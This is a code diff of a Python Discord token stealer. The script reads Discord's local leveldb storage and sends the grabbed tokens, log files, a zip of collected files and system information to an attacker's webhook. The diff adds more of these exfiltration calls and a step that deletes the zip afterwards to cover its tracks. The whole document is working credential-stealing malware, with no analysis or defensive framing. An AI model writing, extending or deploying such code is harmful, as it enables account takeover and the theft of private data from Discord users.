@@ -22,7 +22,7 @@ userinfo = ''
 leveldbdir = "\\discord\\Local Storage\\"
 discordloc = leveldbdir+'leveldb\\' 
 tokendir = str(path)+str(discordloc)
-hook = Webhook('WebHook_Link_Here')
+hook = Webhook('WEBHOOK_LINK_HERE')
 logfile = []
 zipf = 'lol.zip'
 
@@ -64,10 +64,18 @@ def main():
         for x in logfile:
             if logfile != '':
                 hook.send('Token Grabbed: '+x)
-                print(tempzipdir)
+                for x in logfile:
+                  hook.send("Log File('s): "+x)
                 hook.send('Zip File:', file = File('./'+zipf, name=zipf)) # Remember whatever location this is installed @ it will attempt to save files here and upload.
+                hook.send('PC Info: '+getinfo())
             else:
                 hook.send('Failed to grab token.')
                 hook.send('PC Info: '+getinfo())
+    print('Starting Cleanup')
+    try:
+      os.remove(zipf)
+      print('Removed Our zip')
+    except:
+      return ''
 
 main()
